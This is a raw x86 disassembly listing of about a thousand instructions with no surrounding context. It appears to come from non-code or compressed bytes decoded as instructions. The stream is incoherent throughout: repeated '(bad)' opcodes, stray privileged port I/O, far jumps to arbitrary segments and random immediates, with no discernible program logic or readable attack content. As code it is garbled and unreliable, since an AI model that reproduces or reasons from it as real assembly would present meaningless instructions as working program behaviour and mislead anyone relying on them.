  41e5be:	sar    DWORD PTR [edi+0x24],0xc4
  41e5c2:	jne    0x41e568
  41e5c4:	jg     0x41e587
  41e5c6:	mov    ch,0x76
  41e5c8:	pop    es
  41e5c9:	test   al,0x2a
  41e5cb:	jge    0x41e5be
  41e5cd:	leave  
  41e5ce:	dec    ecx
  41e5cf:	xor    DWORD PTR [ebp-0x4a],edx
  41e5d2:	test   BYTE PTR [edx],dl
  41e5d4:	sbb    BYTE PTR [ebp-0xd0eb057],dl
  41e5da:	retf   0x8c46
  41e5dd:	and    eax,0xee4a2b33
  41e5e2:	dec    ebx
  41e5e3:	out    0xc,eax
  41e5e5:	jnp    0x41e5f7
  41e5e7:	lea    ecx,[esi-0x75]
  41e5ea:	jnp    0x41e5c3
  41e5ec:	mov    edx,0x78d7267f
  41e5f1:	xchg   ebx,eax
  41e5f2:	pusha  
  41e5f3:	das    
  41e5f4:	loopne 0x41e673
  41e5f6:	mov    BYTE PTR [eax],ch
  41e5f8:	add    bh,BYTE PTR [edx-0x35]
  41e5fb:	call   DWORD PTR [ebp+eax*2+0x16]
  41e5ff:	push   0xefa6f944
  41e604:	cmp    eax,edi
  41e606:	test   BYTE PTR [eax+0x2a],bh
  41e609:	push   0x3b
  41e60b:	pusha  
  41e60c:	cmp    eax,0x53b92bfe
  41e611:	cli    
  41e612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e613:	hlt    
  41e614:	xchg   ebp,eax
  41e615:	and    DWORD PTR [ebx+0x42],eax
  41e618:	mov    edx,0x9654ad9e
  41e61d:	add    al,0xb6
  41e61f:	cld    
  41e620:	fsub   QWORD PTR [ebp+0x57]
  41e623:	xchg   DWORD PTR [ebp+0xe62bd05],edi
  41e629:	in     al,dx
  41e62a:	mov    ds:0x7c3e356c,al
  41e62f:	fldenv [eax+0x595053c4]
  41e635:	xchg   ebx,eax
  41e636:	jl     0x41e5ee
  41e638:	inc    esp
  41e639:	aaa    
  41e63a:	push   edi
  41e63b:	mov    al,ah
  41e63d:	data16 sub bl,dl
  41e640:	and    DWORD PTR [edx-0x72b1e3e9],ecx
  41e646:	push   ds
  41e647:	fldcw  WORD PTR [ebx-0x1c6678cd]
  41e64d:	ret    0xd1fd
  41e650:	jl     0x41e694
  41e652:	mov    ebp,0xb1ac20e8
  41e657:	and    ah,ch
  41e659:	dec    ebx
  41e65a:	or     eax,0xd6ff2df6
  41e65f:	dec    edi
  41e660:	pop    ss
  41e661:	cli    
  41e662:	arpl   WORD PTR [edi-0x96a857],di
  41e668:	les    ecx,FWORD PTR [ecx]
  41e66a:	dec    DWORD PTR [ebx+ecx*4]
  41e66d:	(bad)  
  41e66e:	cmp    edi,esi
  41e670:	call   0x9fac:0x34e34b02
  41e677:	pop    esi
  41e678:	or     edi,DWORD PTR [ebx+0x41]
  41e67b:	xchg   esp,eax
  41e67c:	jns    0x41e692
  41e67e:	adc    BYTE PTR [esi+0x7f751df0],0x78
  41e685:	stos   DWORD PTR es:[edi],eax
  41e686:	mov    al,ds:0xd411a3cc
  41e68b:	pop    ecx
  41e68c:	xlat   BYTE PTR ds:[ebx]
  41e68d:	(bad)  
  41e68f:	mov    ss,ebx
  41e691:	dec    ecx
  41e692:	add    eax,0x28025bed
  41e697:	and    eax,DWORD PTR [eax-0x15968793]
  41e69d:	mov    WORD PTR [ebx+0x6],cs
  41e6a0:	jns    0x41e6e4
  41e6a2:	mov    esi,0x7ea80ac1
  41e6a7:	add    esi,ebp
  41e6a9:	sbb    ebp,esp
  41e6ab:	iret   
  41e6ac:	pop    esp
  41e6ad:	in     al,0x4b
  41e6af:	loopne 0x41e638
  41e6b1:	jmp    0xd4539f3f
  41e6b6:	inc    eax
  41e6b7:	scas   al,BYTE PTR es:[edi]
  41e6b8:	aam    0x51
  41e6ba:	xor    bl,cl
  41e6bc:	jbe    0x41e65b
  41e6be:	or     eax,0xffffffaf
  41e6c1:	dec    edx
  41e6c2:	nop
  41e6c3:	sbb    al,0x9b
  41e6c5:	test   DWORD PTR [eax-0x9383f5d],edx
  41e6cb:	stos   DWORD PTR es:[edi],eax
  41e6cc:	push   ds
  41e6cd:	out    0x8d,al
  41e6cf:	cmp    DWORD PTR [edx+0x7c],esi
  41e6d2:	and    BYTE PTR [edi],cl
  41e6d4:	gs cmp al,0x26
  41e6d7:	xchg   ebx,eax
  41e6d8:	jmp    0xadf7:0xe829c07b
  41e6df:	and    ah,bl
  41e6e1:	cmp    al,BYTE PTR [ecx-0x12c1a6d]
  41e6e7:	jg     0x41e732
  41e6e9:	xchg   BYTE PTR [ebx],al
  41e6eb:	xor    eax,0x26d592b7
  41e6f0:	pop    edi
  41e6f1:	dec    ebp
  41e6f2:	jne    0x41e6c4
  41e6f4:	test   BYTE PTR [edx],dh
  41e6f6:	stos   DWORD PTR es:[edi],eax
  41e6f7:	sub    al,0x3
  41e6f9:	fsubr  QWORD PTR [eax-0x34]
  41e6fc:	(bad)  
  41e6fd:	and    DWORD PTR [edi],edx
  41e6ff:	in     eax,dx
  41e700:	ins    DWORD PTR es:[edi],dx
  41e701:	dec    edi
  41e702:	test   eax,0xf29cad2e
  41e707:	push   ecx
  41e708:	in     al,dx
  41e709:	fisub  DWORD PTR [esi+0x22]
  41e70c:	push   esp
  41e70d:	lahf   
  41e70e:	jne    0x41e769
  41e710:	jmp    0x23a313e4
  41e715:	jmp    0x4f2a:0x787e55e3
  41e71c:	or     al,0x97
  41e71e:	xchg   edi,eax
  41e71f:	jle    0x41e6f0
  41e721:	fdiv   DWORD PTR [ebx+0x15]
  41e724:	sub    BYTE PTR [esi],al
  41e726:	inc    ebx
  41e727:	or     DWORD PTR [ebp+0x28],ecx
  41e72a:	push   eax
  41e72b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e72c:	(bad)  [eax+0x576cc5c5]
  41e732:	jo     0x41e76a
  41e734:	stc    
  41e735:	add    esi,ecx
  41e737:	pop    esp
  41e738:	mov    dl,0xf
  41e73a:	scas   eax,DWORD PTR es:[edi]
  41e73b:	stc    
  41e73c:	in     al,0x28
  41e73e:	mov    cl,0xbf
  41e740:	jl     0x41e6e1
  41e742:	sub    edi,DWORD PTR [ebx]
  41e744:	ror    BYTE PTR [esi-0x3669284d],0x8c
  41e74b:	popa   
  41e74c:	mov    ds:0xf4fb0491,eax
  41e751:	cwde   
  41e752:	jle    0x41e7b9
  41e754:	int3   
  41e755:	inc    ecx
  41e756:	xchg   edi,eax
  41e757:	push   cs
  41e758:	mov    edi,0xe4ce1719
  41e75d:	mov    esi,0x450d99d7
  41e762:	dec    ebp
  41e763:	dec    edi
  41e764:	arpl   WORD PTR [esi],di
  41e766:	jae    0x41e743
  41e768:	jae    0x41e77e
  41e76a:	xchg   ebp,eax
  41e76b:	jg     0x41e747
  41e76d:	sar    esi,0xb9
  41e770:	xor    BYTE PTR [ebp-0x666ef9de],ah
  41e776:	mov    eax,ds:0xa0bb7d7a
  41e77b:	or     BYTE PTR [ecx],bl
  41e77d:	out    0xd3,al
  41e77f:	arpl   WORD PTR [edi*4+0x2fb8a95c],di
  41e786:	adc    DWORD PTR [ecx-0x13],edx
  41e789:	jl     0x41e748
  41e78b:	xchg   DWORD PTR [edx],edi
  41e78d:	imul   edx,DWORD PTR [ecx+0xe],0x4a
  41e791:	jmp    0x41e7d4
  41e793:	push   edx
  41e794:	cmp    eax,0x10793a4f
  41e799:	xchg   esp,eax
  41e79a:	js     0x41e795
  41e79c:	daa    
  41e79d:	les    esi,FWORD PTR [esp+ebx*8-0x37]
  41e7a1:	frstpm(287 only) 
  41e7a3:	fs jl  0x41e7a7
  41e7a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7a7:	sub    DWORD PTR [edi-0x15],edi
  41e7aa:	pop    esp
  41e7ab:	pop    edx
  41e7ac:	jae    0x41e7da
  41e7ae:	sbb    al,0x41
  41e7b0:	jo     0x41e77b
  41e7b2:	mov    ebp,0x59477824
  41e7b7:	mov    eax,DWORD PTR [ebx+0x9e64463]
  41e7bd:	mov    ebx,0x5dfd8f54
  41e7c2:	jp     0x41e7a9
  41e7c4:	mov    ds:0xb9fb044,eax
  41e7c9:	out    0xa1,al
  41e7cb:	pop    edi
  41e7cc:	pop    ebp
  41e7cd:	(bad)  
  41e7ce:	mov    eax,0xeb18039
  41e7d3:	pop    edi
  41e7d4:	xor    eax,0x61a0a48c
  41e7d9:	inc    edi
  41e7da:	out    dx,al
  41e7db:	(bad)  
  41e7dc:	push   ebp
  41e7dd:	sti    
  41e7de:	cmp    eax,0x51c593a6
  41e7e3:	das    
  41e7e4:	pop    ss
  41e7e5:	sub    BYTE PTR [eax+0x26],0x29
  41e7e9:	sar    BYTE PTR [ebp+edi*2-0x4ed45fd5],0xc4
  41e7f1:	xchg   edi,eax
  41e7f2:	push   eax
  41e7f3:	aaa    
  41e7f4:	fsubr  DWORD PTR [ecx-0x3fab7821]
  41e7fa:	nop
  41e7fb:	cli    
  41e7fc:	cmp    eax,0xbea6480b
  41e801:	xchg   ebx,eax
  41e802:	mov    eax,ds:0x4ac54c34
  41e807:	sub    eax,0xe5a13e31
  41e80c:	sar    DWORD PTR [ebp+esi*1-0x7bfc81b4],0x98
  41e814:	ficomp WORD PTR [eax+0x73e78a7f]
  41e81a:	sbb    dh,dl
  41e81c:	xchg   ecx,eax
  41e81d:	mov    ch,BYTE PTR ds:0xbef0d36e
  41e823:	jns    0x41e885
  41e825:	or     al,0x4a
  41e827:	dec    ebp
  41e828:	out    dx,al
  41e829:	or     al,0xcd
  41e82b:	ss not ebp
  41e82e:	sbb    BYTE PTR [ebp-0x12],ch
  41e831:	xor    eax,0x7bf043a7
  41e836:	rcl    bh,cl
  41e838:	jmp    0x41e869
  41e83a:	(bad)  
  41e83b:	imul   edi,DWORD PTR [ecx-0x9],0x33
  41e83f:	dec    dl
  41e841:	add    eax,0x933dea7a
  41e846:	loope  0x41e879
  41e848:	adc    bl,al
  41e84a:	jl     0x41e84e
  41e84c:	pushf  
  41e84d:	pop    edi
  41e84e:	test   DWORD PTR [eax],esp
  41e850:	lods   al,BYTE PTR ds:[esi]
  41e851:	pusha  
  41e852:	daa    
  41e853:	mov    ch,0xb1
  41e855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e856:	inc    ebx
  41e857:	stos   BYTE PTR es:[edi],al
  41e858:	push   esp
  41e859:	xchg   esp,eax
  41e85a:	rcl    ch,0x9d
  41e85d:	icebp  
  41e85e:	add    dh,ah
  41e860:	push   ecx
  41e861:	lahf   
  41e862:	pop    edi
  41e863:	aad    0x91
  41e865:	dec    ebx
  41e866:	lahf   
  41e867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e868:	mov    ch,0xc1
  41e86a:	xchg   esi,eax
  41e86b:	ret    0xd2fa
  41e86e:	sub    cl,BYTE PTR [ecx-0x75]
  41e871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e872:	js     0x41e871
  41e874:	sub    al,BYTE PTR [ebx-0x49c2a52e]
  41e87a:	jp     0x41e8eb
  41e87c:	fld    DWORD PTR [esp+esi*8-0x9]
  41e880:	pop    esi
  41e881:	mov    ?,WORD PTR [edx]
  41e883:	xchg   DWORD PTR [esi+0x66],ecx
  41e886:	aam    0xa5
  41e888:	inc    ebx
  41e889:	out    0x5,eax
  41e88b:	outs   dx,DWORD PTR ds:[esi]
  41e88c:	adc    DWORD PTR [ebp+0x686cabf7],edi
  41e892:	inc    edx
  41e893:	cmp    eax,0x55a7ecd0
  41e898:	mov    al,0xdf
  41e89a:	imul   eax,DWORD PTR [esi+0x3b058b5],0x828d9ca9
  41e8a4:	(bad)  
  41e8a5:	outs   dx,DWORD PTR ds:[esi]
  41e8a6:	ret    0xda9b
  41e8a9:	xchg   ecx,eax
  41e8aa:	or     DWORD PTR [esi-0x45],esi
  41e8ad:	fmul   DWORD PTR [edx+0x41f26a88]
  41e8b3:	pop    ecx
  41e8b4:	pop    ebp
  41e8b5:	mov    dl,BYTE PTR [ebp+eax*4+0x12]
  41e8b9:	rcr    BYTE PTR [esi],1
  41e8bb:	lods   al,BYTE PTR ds:[esi]
  41e8bc:	stos   BYTE PTR es:[edi],al
  41e8bd:	shl    al,0xc0
  41e8c0:	sbb    al,0x76
  41e8c2:	jle    0x41e8a8
  41e8c4:	pop    edx
  41e8c5:	xchg   dl,dl
  41e8c7:	lahf   
  41e8c8:	push   esi
  41e8c9:	fs jle 0x41e84f
  41e8cc:	cli    
  41e8cd:	loopne 0x41e879
  41e8cf:	pop    ebp
  41e8d0:	adc    ecx,DWORD PTR ds:0x3353ea39
  41e8d6:	nop
  41e8d7:	xor    cl,cl
  41e8d9:	test   eax,0x230c6585
  41e8de:	aaa    
  41e8df:	xchg   ecx,eax
  41e8e0:	push   esi
  41e8e1:	sub    DWORD PTR [eax],edi
  41e8e3:	cs dec ecx
  41e8e5:	js     0x41e953
  41e8e7:	xchg   edx,eax
  41e8e8:	mov    ds:0x11767c2,al
  41e8ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8ee:	loop   0x41e891
  41e8f0:	adc    ebx,DWORD PTR [edi+eiz*2]
  41e8f3:	inc    ebp
  41e8f4:	fs push cx
  41e8f7:	dec    esp
  41e8f8:	or     bl,0x12
  41e8fb:	mov    esi,0xa3b5141d
  41e900:	push   ecx
  41e901:	outs   dx,BYTE PTR ds:[esi]
  41e902:	sbb    DWORD PTR [edx+0x5eaaef9b],edi
  41e908:	hlt    
  41e909:	loop   0x41e92c
  41e90b:	push   edi
  41e90c:	cdq    
  41e90d:	cmc    
  41e90e:	cmp    dh,BYTE PTR [ecx-0x7a]
  41e911:	(bad)  
  41e912:	xor    edx,edx
  41e914:	and    al,0x48
  41e916:	sahf   
  41e917:	mov    DWORD PTR [esi-0x4f],ebx
  41e91a:	outs   dx,BYTE PTR ds:[esi]
  41e91b:	mov    bl,0x8b
  41e91d:	inc    eax
  41e91e:	ins    BYTE PTR es:[edi],dx
  41e91f:	in     eax,0x8e
  41e921:	push   es
  41e922:	push   ecx
  41e923:	jecxz  0x41e93f
  41e925:	or     DWORD PTR [ecx+0x5075156],0x448ec42e
  41e92f:	adc    eax,0x949d8f04
  41e934:	popa   
  41e935:	loope  0x41e923
  41e937:	and    al,0x9
  41e939:	push   edi
  41e93a:	enter  0x9591,0xd3
  41e93e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e93f:	xor    al,0x14
  41e941:	cmp    dh,BYTE PTR [ebx+0x19c6bb03]
  41e947:	jne    0x41e8e3
  41e949:	fcom   st(2)
  41e94b:	jge    0x41e951
  41e94d:	pop    esi
  41e94e:	add    dh,dl
  41e950:	xchg   ebp,eax
  41e951:	neg    ebp
  41e953:	out    dx,eax
  41e954:	retf   
  41e955:	pop    edi
  41e956:	gs or  ecx,ecx
  41e959:	jb     0x41e95f
  41e95b:	outs   dx,BYTE PTR ds:[esi]
  41e95c:	enter  0xc500,0x7f
  41e960:	push   edx
  41e961:	inc    esi
  41e962:	inc    ebx
  41e963:	adc    cl,BYTE PTR [esp+ebx*8]
  41e966:	fwait
  41e967:	xor    DWORD PTR [eax-0x58c71224],ebp
  41e96d:	mov    edi,0x92f2059f
  41e972:	push   ds
  41e973:	or     al,0xb4
  41e975:	push   ecx
  41e976:	xor    DWORD PTR [ecx+0x69],esp
  41e979:	sbb    eax,DWORD PTR [edx]
  41e97b:	xor    bl,BYTE PTR [eax-0x43bf5e43]
  41e981:	in     al,dx
  41e982:	and    DWORD PTR [esi],esp
  41e984:	repz test ch,ch
  41e987:	ret    0x1058
  41e98a:	inc    ebp
  41e98b:	jo     0x41e95b
  41e98d:	push   0xbf4b2063
  41e992:	jo     0x41e9cd
  41e994:	adc    DWORD PTR [ebp-0x6b417171],0x40
  41e99b:	(bad)  
  41e99c:	outs   dx,BYTE PTR ds:[esi]
  41e99d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e99e:	jmp    0x91d47023
  41e9a3:	enter  0x6f6a,0xc
  41e9a7:	ror    ah,1
  41e9a9:	mul    BYTE PTR [ebx]
  41e9ab:	imul   eax,DWORD PTR [esi+esi*1+0x6f],0x9
  41e9b0:	out    dx,eax
  41e9b1:	in     al,0xba
  41e9b3:	push   es
  41e9b4:	mul    edi
  41e9b6:	fwait
  41e9b7:	test   BYTE PTR [edx-0x17c504af],ch
  41e9bd:	(bad)  
  41e9be:	aam    0x73
  41e9c0:	add    edi,DWORD PTR [ecx-0x1a]
  41e9c3:	or     BYTE PTR [ecx-0x6b],dl
  41e9c6:	retf   
  41e9c7:	std    
  41e9c8:	scas   eax,DWORD PTR es:[edi]
  41e9c9:	fdivr  QWORD PTR [ebx-0x3e]
  41e9cc:	scas   al,BYTE PTR es:[edi]
  41e9cd:	ds in  eax,0xaf
  41e9d0:	pop    eax
  41e9d1:	mov    edi,DWORD PTR [edx+0x4]
  41e9d4:	mov    esp,ebp
  41e9d6:	sahf   
  41e9d7:	sbb    DWORD PTR [ebx],esi
  41e9d9:	sbb    ah,BYTE PTR ds:0x23ea4e4e
  41e9df:	mov    ebp,0x57b5d964
  41e9e4:	inc    eax
  41e9e5:	push   0xffffff92
  41e9e7:	nop
  41e9e8:	repz les ebx,FWORD PTR [eax-0x40]
  41e9ec:	dec    eax
  41e9ed:	inc    ebp
  41e9ee:	cmp    dh,BYTE PTR [ecx-0x73cdeab4]
  41e9f4:	push   ecx
  41e9f5:	mov    WORD PTR [ecx+0x70],cs
  41e9f8:	and    BYTE PTR [edi+0x13cbdcb5],ah
  41e9fe:	and    ebx,DWORD PTR [edx]
  41ea00:	push   ebp
  41ea01:	das    
  41ea02:	dec    ebx
  41ea03:	dec    edi
  41ea04:	xchg   esp,eax
  41ea05:	inc    ebx
  41ea06:	int3   
  41ea07:	test   DWORD PTR [esi],ecx
  41ea09:	mov    eax,ds:0x839d14e6
  41ea0e:	out    dx,al
  41ea0f:	dec    ecx
  41ea10:	and    edi,ebp
  41ea12:	cmc    
  41ea13:	inc    ebp
  41ea14:	push   ebp
  41ea15:	call   0xd452:0xeb691d65
  41ea1c:	xor    DWORD PTR [ebx+edi*4-0x6095cf87],0x44
  41ea24:	cmp    dl,ah
  41ea26:	mov    WORD PTR [ebx],ss
  41ea28:	or     eax,0x7c71ff6f
  41ea2d:	sub    DWORD PTR [esi-0x14],esp
  41ea30:	sub    eax,0xbd3503e3
  41ea35:	test   al,0xea
  41ea37:	ins    DWORD PTR es:[edi],dx
  41ea38:	jo     0x41ea60
  41ea3a:	je     0x41eab1
  41ea3c:	inc    esi
  41ea3d:	lods   al,BYTE PTR ds:[esi]
  41ea3e:	jl     0x41ea15
  41ea40:	and    esi,DWORD PTR [esi-0x69c4b088]
  41ea46:	mov    ebx,0xb8c877e0
  41ea4b:	add    DWORD PTR [edx+0x66f1a8aa],0xffffffa9
  41ea52:	push   esi
  41ea53:	adc    DWORD PTR [edx+esi*2-0x20a03679],ecx
  41ea5a:	jg     0x41ea31
  41ea5c:	ret    0xddd0
  41ea5f:	jae    0x41ea1c
  41ea61:	bound  edx,QWORD PTR [eax]
  41ea63:	aaa    
  41ea64:	inc    ebx
  41ea65:	arpl   si,ax
  41ea67:	push   eax
  41ea68:	call   0x85aa6d40
  41ea6d:	popw   ds
  41ea6f:	cmp    eax,DWORD PTR [esi-0x53f106a0]
  41ea75:	jae    0x41ea64
  41ea77:	es lahf 
  41ea79:	lahf   
  41ea7a:	or     BYTE PTR [edx-0x65],dh
  41ea7d:	sub    ch,BYTE PTR [edx-0x70329035]
  41ea83:	cmp    eax,0xb4701aa4
  41ea88:	xchg   edi,eax
  41ea89:	inc    esp
  41ea8a:	ret    
  41ea8b:	fisubr DWORD PTR ds:0x4eb43e3d
  41ea91:	pusha  
  41ea92:	inc    esp
  41ea93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea94:	jmp    0xb131:0x679ba52f
  41ea9b:	sub    BYTE PTR ds:0xf8afe86b,al
  41eaa1:	xor    edx,ecx
  41eaa3:	cmp    esp,DWORD PTR [ebp-0x8adfe61]
  41eaa9:	es dec ebp
  41eaab:	xor    al,bh
  41eaad:	bound  ebx,QWORD PTR [ecx+0x46]
  41eab0:	adc    bl,BYTE PTR [ecx-0x7c5265c7]
  41eab6:	ret    
  41eab7:	out    dx,eax
  41eab8:	pop    esi
  41eab9:	(bad)  
  41eaba:	push   ecx
  41eabb:	jge    0x41eae3
  41eabd:	sub    ecx,edi
  41eabf:	add    al,0xee
  41eac1:	and    eax,DWORD PTR [ebx]
  41eac3:	or     DWORD PTR [ebp-0x38],edi
  41eac6:	dec    ebp
  41eac7:	mov    ecx,0x38293e80
  41eacc:	cmp    al,0xb
  41eace:	sbb    al,0xd6
  41ead0:	mov    esi,0x36ed61e0
  41ead5:	mov    al,ds:0x791ed237
  41eada:	add    BYTE PTR [ebx],dh
  41eadc:	jg     0x41eaaf
  41eade:	mov    bl,0xf0
  41eae0:	in     eax,0x3c
  41eae2:	ja     0x41ea9d
  41eae4:	inc    edi
  41eae5:	mul    DWORD PTR [ebp+ecx*1-0x2ba73998]
  41eaec:	pop    eax
  41eaed:	pop    es
  41eaee:	mov    esi,0x54943569
  41eaf3:	lahf   
  41eaf4:	fistp  DWORD PTR [esi-0x63]
  41eaf7:	dec    BYTE PTR [ecx-0x2cd53faf]
  41eafd:	mov    esp,0xb5ed3f39
  41eb02:	add    DWORD PTR [ebx],edx
  41eb04:	xor    DWORD PTR [ecx-0x659ecaa9],edi
  41eb0a:	fadd   DWORD PTR [edx]
  41eb0c:	xchg   WORD PTR [ebp+ecx*1+0x6],cx
  41eb11:	leave  
  41eb12:	in     eax,0xeb
  41eb14:	ret    
  41eb15:	out    dx,eax
  41eb16:	adc    eax,0xa90074c5
  41eb1b:	repz push ecx
  41eb1d:	mov    ch,0x2f
  41eb1f:	ret    
  41eb20:	daa    
  41eb21:	mov    eax,ds:0xcba4c82a
  41eb26:	pop    ds
  41eb27:	or     dl,BYTE PTR [bx+si-0x43a0]
  41eb2c:	sub    ecx,DWORD PTR [ecx]
  41eb2e:	sub    al,0x10
  41eb30:	xchg   esp,eax
  41eb31:	retf   
  41eb32:	ret    0x3666
  41eb35:	sub    esp,ecx
  41eb37:	gs mov ecx,0xe2e2629d
  41eb3d:	xor    DWORD PTR [edi+0x11619a3d],ecx
  41eb43:	cmc    
  41eb44:	outs   dx,DWORD PTR ds:[esi]
  41eb45:	cld    
  41eb46:	sbb    al,0xb
  41eb48:	cs cmc 
  41eb4a:	jge    0x41eba5
  41eb4c:	jne    0x41eb8a
  41eb4e:	icebp  
  41eb4f:	push   cs
  41eb50:	stos   DWORD PTR es:[edi],eax
  41eb51:	push   ds
  41eb52:	pop    esi
  41eb53:	mov    al,0xd5
  41eb55:	mov    eax,0xc1d0297d
  41eb5a:	pusha  
  41eb5b:	(bad)  
  41eb5c:	into   
  41eb5d:	dec    esp
  41eb5e:	fnclex 
  41eb60:	pushf  
  41eb61:	jge    0x41eb25
  41eb63:	fdiv   st,st(1)
  41eb65:	adc    bl,BYTE PTR [edx-0x5b897546]
  41eb6b:	push   ds
  41eb6c:	inc    ebx
  41eb6d:	daa    
  41eb6e:	pop    eax
  41eb6f:	outs   dx,DWORD PTR ds:[esi]
  41eb70:	cmp    edx,DWORD PTR [eax+0xf]
  41eb73:	or     eax,0x89a45d2c
  41eb78:	and    eax,0xc781162b
  41eb7d:	push   edi
  41eb7e:	push   es
  41eb7f:	xchg   DWORD PTR [edx],esi
  41eb81:	into   
  41eb82:	push   0x1e
  41eb84:	cmp    dl,BYTE PTR [edx]
  41eb86:	aad    0x84
  41eb88:	dec    esp
  41eb89:	sbb    DWORD PTR [edi+eiz*1],esp
  41eb8c:	pusha  
  41eb8d:	xchg   edx,eax
  41eb8e:	pusha  
  41eb8f:	jge    0x41ebf8
  41eb91:	in     eax,dx
  41eb92:	mov    DWORD PTR [esi+0x6a228eea],edi
  41eb98:	test   ebx,edx
  41eb9a:	cld    
  41eb9b:	xchg   ebx,eax
  41eb9c:	and    al,0x74
  41eb9e:	fdivr  QWORD PTR [ecx-0x6049cdff]
  41eba4:	test   al,0x8d
  41eba6:	aas    
  41eba7:	jae    0x41eb67
  41eba9:	inc    esp
  41ebaa:	xor    eax,0x70a13cd2
  41ebaf:	out    0xbe,al
  41ebb1:	aas    
  41ebb2:	outs   dx,DWORD PTR ds:[esi]
  41ebb3:	inc    ecx
  41ebb4:	in     eax,0x8a
  41ebb6:	es je  0x41ec01
  41ebb9:	inc    ebp
  41ebba:	outs   dx,BYTE PTR ds:[esi]
  41ebbb:	cs in  eax,dx
  41ebbd:	int    0x7e
  41ebbf:	cs dec ecx
  41ebc1:	out    0x96,al
  41ebc3:	xchg   ecx,eax
  41ebc4:	xor    BYTE PTR [ecx],ah
  41ebc6:	pushf  
  41ebc7:	shr    DWORD PTR [edx+0xc],cl
  41ebca:	jl     0x41ec00
  41ebcc:	(bad)  
  41ebcd:	cmp    bh,BYTE PTR [esi+0x7c]
  41ebd0:	imul   eax,DWORD PTR [ebx+ebp*8],0xc433aaf5
  41ebd7:	push   ds
  41ebd8:	fsubr  st,st(5)
  41ebda:	lods   al,BYTE PTR ds:[esi]
  41ebdb:	xchg   esp,eax
  41ebdc:	and    al,0xea
  41ebde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebdf:	lods   eax,DWORD PTR ds:[esi]
  41ebe0:	int3   
  41ebe1:	and    DWORD PTR [ecx-0x1ea36a2e],ebp
  41ebe7:	retf   
  41ebe8:	popf   
  41ebe9:	loopne 0x41ec04
  41ebeb:	mov    ebp,0xd280c1f
  41ebf0:	or     DWORD PTR [ebx-0x42dded51],ecx
  41ebf6:	xlat   BYTE PTR ds:[ebx]
  41ebf7:	inc    esi
  41ebf8:	clc    
  41ebf9:	pusha  
  41ebfa:	push   esp
  41ebfb:	xor    eax,0x15326ad8
  41ec00:	clc    
  41ec01:	mov    cl,0xcf
  41ec03:	inc    ebp
  41ec04:	push   cs
  41ec05:	fidiv  DWORD PTR [edx-0x37fab9ab]
  41ec0b:	cmc    
  41ec0c:	push   es
  41ec0d:	imul   BYTE PTR [ebp+0x3f]
  41ec10:	xchg   DWORD PTR [edx+0x4a],esp
  41ec13:	pop    ebp
  41ec14:	pop    edi
  41ec15:	fadd   QWORD PTR [eax+0x49]
  41ec18:	stos   DWORD PTR es:[edi],eax
  41ec19:	cmp    al,0xa8
  41ec1b:	xchg   ebp,eax
  41ec1c:	cli    
  41ec1d:	jo     0x41ec71
  41ec1f:	and    bl,BYTE PTR [ebx]
  41ec21:	push   ecx
  41ec22:	test   edi,edx
  41ec24:	push   es
  41ec25:	popa   
  41ec26:	gs test eax,0x8e89902a
  41ec2c:	rcl    BYTE PTR [esi-0x1f04178c],cl
  41ec32:	add    eax,0xf783a8c
  41ec37:	or     BYTE PTR [edx],bl
  41ec39:	xor    bl,ch
  41ec3b:	stos   DWORD PTR es:[edi],eax
  41ec3c:	xor    DWORD PTR [ebp-0x77a3badd],ebp
  41ec42:	std    
  41ec43:	sbb    al,0x27
  41ec45:	xchg   BYTE PTR [ecx-0x1d],dl
  41ec48:	add    al,0x98
  41ec4a:	pop    ebp
  41ec4b:	and    eax,0xe06c518d
  41ec50:	mov    ecx,0x51446d27
  41ec55:	adc    DWORD PTR [edx],ecx
  41ec57:	jmp    0x25af:0xd1a9e4cc
  41ec5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec5f:	stos   BYTE PTR es:[edi],al
  41ec60:	or     dl,BYTE PTR [ebx-0x13]
  41ec63:	xchg   ebp,eax
  41ec64:	pushf  
  41ec65:	je     0x41ec2a
  41ec67:	mov    ecx,0x636a0cca
  41ec6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec6d:	pop    ebx
  41ec6e:	xchg   edi,eax
  41ec6f:	out    0xcf,al
  41ec71:	fmul   QWORD PTR [edx-0x76]
  41ec74:	push   ebp
  41ec75:	daa    
  41ec76:	rcr    BYTE PTR [esi-0x2d802c9b],0xad
  41ec7d:	test   DWORD PTR [esi-0x71a09461],eax
  41ec83:	iret   
  41ec84:	pushf  
  41ec85:	push   eax
  41ec86:	fist   DWORD PTR [edi+0x4f]
  41ec89:	jg     0x41ec19
  41ec8b:	icebp  
  41ec8c:	out    0x89,eax
  41ec8e:	out    0xdd,al
  41ec90:	stc    
  41ec91:	xchg   BYTE PTR [eax-0x75],ch
  41ec94:	xlat   BYTE PTR ds:[ebx]
  41ec95:	push   cs
  41ec96:	adc    ebx,DWORD PTR [ebp-0x17e90cfc]
  41ec9c:	sub    ch,0xd5
  41ec9f:	jne    0x41ec75
  41eca1:	(bad)  
  41eca2:	repz mov esp,0x38d55741
  41eca8:	mov    ds:0x6779b2a1,al
  41ecad:	push   ds
  41ecae:	(bad)  
  41ecaf:	ds mov ah,0x4b
  41ecb2:	push   ebp
  41ecb3:	cli    
  41ecb4:	add    al,0xe9
  41ecb6:	inc    ecx
  41ecb7:	icebp  
  41ecb8:	dec    edi
  41ecb9:	and    dl,cl
  41ecbb:	sbb    al,BYTE PTR [edx+0x72]
  41ecbe:	fistp  DWORD PTR [ebx]
  41ecc0:	push   ecx
  41ecc1:	ret    
  41ecc2:	iret   
  41ecc3:	in     eax,dx
  41ecc4:	add    eax,0x24070a63
  41ecc9:	aad    0xfd
  41eccb:	sub    eax,0x7acb66f8
  41ecd0:	shl    DWORD PTR [edx+0x7a63d52e],1
  41ecd6:	add    ebx,DWORD PTR [edx+0x1aefeacd]
  41ecdc:	sbb    al,0x62
  41ecde:	dec    eax
  41ecdf:	cmp    ebp,DWORD PTR ds:0xd2fd2444
